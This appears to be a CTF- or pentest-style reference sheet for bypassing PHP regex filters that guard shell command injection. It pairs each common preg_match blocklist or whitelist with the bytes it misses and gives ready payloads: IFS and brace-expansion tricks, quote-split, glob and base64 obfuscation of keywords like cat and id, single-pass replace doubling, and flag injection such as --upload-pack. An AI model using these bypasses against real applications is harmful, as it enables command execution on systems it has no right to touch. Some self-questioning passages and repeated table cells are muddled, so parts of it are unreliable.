# Regex Filters — the pattern-bypass reference

## The common patterns and what they miss

```php
if (preg_match('/[;&|]/', $x)) die();       — blocks ; & |
if (preg_match('/[;&|`$]/', $x)) die();     — adds ` and $
if (preg_match('/[;&|`$(){}]/', $x)) die(); — tighter
if (preg_match('/[a-zA-Z]/', $x)) die();    — letters — letter-filter-shell
if (preg_match('/\b(cat|id|ls|whoami)\b/i', $x)) die();  — keyword
if (!preg_match('/^[0-9.]+$/', $x)) die();  — numeric/IP whitelist
if (!preg_match('/^[a-z0-9.-]+$/', $x)) die(); — hostname whitelist
if (preg_match('/(\s|;|&|\||`|\$)/', $x)) die(); — whitespace+meta
```

## The "blocklist missing the byte" — which char is left

| Blocks | Still works |
|---|---|
| `;` `&` `\|` | `\n` `%0a` `` ` `` `$()` `>` `<` `&&` `\|\|` |
| `;` `&` `\|` `` ` `` | `$()` `\n` `>` `<` `&&` `\|\|` `{,}` |
| `;` `&` `\|` `` ` `` `$` | `\n` `{cat,/flag}` `\|` |
| `;` `&` `\|` `` ` `` `$` `(`/`)` | `\n` `{,}` `\|` `{x,y}` `{,}` |
| `;` `&` `\|` `` ` `` `$` `(`/`)` `{`/`}` | `\n` `\|` |
| `;` `&` `\|` `` ` `` `$` `(`/`)` `{`/`}` `\n` | `\|` `\t` `%09` `%0d` |
| all metas | argv/flag-position — `argument-injection.md` |

## The keyword-list bypass — `cat`/`id`/`ls`/`whoami` blocked

| Form | Works |
|---|---|
| `c'a't` | quote-split |
| `c"a"t` | dquote-split |
| `c\at` | backslash |
| `c$@at`/`ca$@t` | `$@` inject |
| `ca$@t`/`cat` via `$@` | `$@`=$@ empty |
| `c'at`/`c''at`/`c'''at` | quote-join |
| `ca''t`/`ca""t` | concat |
| `${x}at`/`ca${x}t`/`${x}` var | var |
| `$(echo Y2F0\|base64 -d)` | decode |
| `$(printf '\x63\x61\x74')` | byte-build |
| `/???/cat`/`/???/c?t` | glob |
| `f=/bin/cat;$f` | var-assign |
| `c$(echo YQ==\|base64 -d)t` | letter-fragment |
| `x=ca;$x't'` | concat-var |
| `cat`+`${IFS}` | IFS survives letter-filter |
| `` ` ``-wrapped | `` `c$@at` `` |
| `ca\t`/`c\at`/`c$'\141't` | escapes |
| `command cat`/`builtin cat`/`exec cat` | builtin-name |
| `env cat`/`. /etc/...` | the source/dot-form |

## The `^[0-9.]+$` numeric/IP whitelist — the hardest filter

Only digits and dots pass — `127.0.0.1` — no letters, no metas, no
spaces. The escapes:

- is the regex anchored? `preg_match('/[0-9.]/')` without `^$` anchors —
  `x;id` still matches `[0-9.]`? — no, the check is `if (preg_match(...))
  die` or `if (!preg_match(...)) die` — the anchor matters
- `127.0.0.1\nid` — `\n` isn't in `[0-9.]` — rejected
- `0.0.0.0`/`255.255.255.255` — only IPs — no bytes for commands — DEAD?
  Not quite:
  - the arg-position: `127.0.0.1` → `ping -c 4 127.0.0.1` — arg-injection
    needs `-`/letters — also filtered
  - `argv[1]` is the IP — ping's `-c`/`-s`/`-p`/`@` flags need letters —
  - the filter is a real wall — the ONLY way is the `.`/`0-9` subset:
    `$( )`/digits/dots — nothing to build with — class is likely dead
  - UNLESS the regex has an anchor bug — `preg_match('/[0-9.]/')` —
    matches ANY 0-9. substring — `x;id1` passes (contains `1`)

## The `^[a-z0-9.-]+$` hostname whitelist

`a-z` `0-9` `.` `-` — no metas, no spaces. Escapes:

- the arg is the hostname — `ping -c 4 x` — the hostname IS the arg —
  arg-injection needs `-` which IS allowed! `x=-c4`/`x=-f`/`x=--x` —
  `-c`/`--` allowed → flag-injection
- `.`/`a-z` allow full flags — `-f`,`-e`,`-T`,`--upload-pack` all pass —
  `arg-injection-deep.md`

## The `preg_match('/\s/')` whitespace block

space/tab/newline blocked — `${IFS}`/`$IFS$9`/`%09`/`{cmd,arg}`/`<`—

```
cat${IFS}/flag
{cat,/flag}
cat</flag
x=id;$x
x=id;${x}
```

## The `preg_match`/`preg_replace`-only-once bug

`preg_replace('/;/','',$x)` — removes ONE `;` — `;;id` → `;id` — the
second `;` survives. Or `preg_match`/`preg_replace` non-`/g`/`preg_
replace_callback`-limited.

## The `str_replace`/`strtr` single-pass bug

`str_replace(';','',$x)` — `;;` → `;` — double-up the blocked char:
`;;id` → `;id`. Same for `strtr`.

## The `ctype_*`/filter_var whitelist

`ctype_alnum`/`filter_var(FILTER_VALIDATE_IP)`/`filter_var(FILTER_VALIDATE_
DOMAIN)` — the arg-position flags still pass (`-` isn't alnum so `ctype_
alnum` blocks it; `FILTER_VALIDATE_IP`/`_DOMAIN` may pass `-f` if the
validator's grammar allows `-` — domain does).

## The `escapeshellarg`-plus-regex combo

`escapeshellarg` AND a regex — the regex blocks what escaping would
allow — arg-position flags are the remaining surface.

## The blacklist-vs-whitelist inversion — read the pattern

`preg_match('/[;&|]/',$x) && die()` — the LIST is what dies — find the
omitted byte. `preg_match('/^[a-z]+$/')` — the LIST is what LIVES —
find the omitted byte IN the allowed class.

## The multiline/modifier tricks — `/m`/`/s`/`/i`/`/x`/`/u`

- `/^x$/` without `/m` — `x\ny` — `^`/`$` match string-start/end —
  `x\ny` FAILS `^x$`? — yes, `\n` isn't `$`. `/^x$/m` — `x\ny` passes —
  `/m` makes `^`/`$` line-boundaries
- `/i` case — `Id`/`ID`/`iD` if keyword-filter lacks `/i`
- `/u` UTF-8 — unicode chars the filter's byte-class misses
- `/s` — `.` matches `\n` — affects patterns using `.`
- `preg_match` `D`/`U`/`x`/`A`/`J` modifiers — the modifier-miss shapes

## The negated-class miss — `[^a-z]`/`[^0-9]`

`preg_match('/[^a-z0-9.]/')` — allows ONLY the class — a byte outside
`a-z0-9.` is blocked — `;`/`&`/`|`/`$`/`` ` ``/`\n`/space — ALL blocked —
only `a-z0-9.` pass — arg-injection with `-`? — `-` is outside →
blocked too — DEAD if the list is complete.

## The "the filter is on a DIFFERENT field" — injection in a clean param

`?host=<clean>&other=x;id` — if the filter only checks `host` but
`other` reaches the shell — inject there. Map which params are filtered.

## Falsifiers

- the filter's whitelist is `^[0-9.]+$`/`^[a-z0-9]+$` AND the binary's
  arg-position has no useful flag AND the whitelist is anchored —
  class is dead on this surface

## Output to record

- which regex + which byte it missed + the bypass form
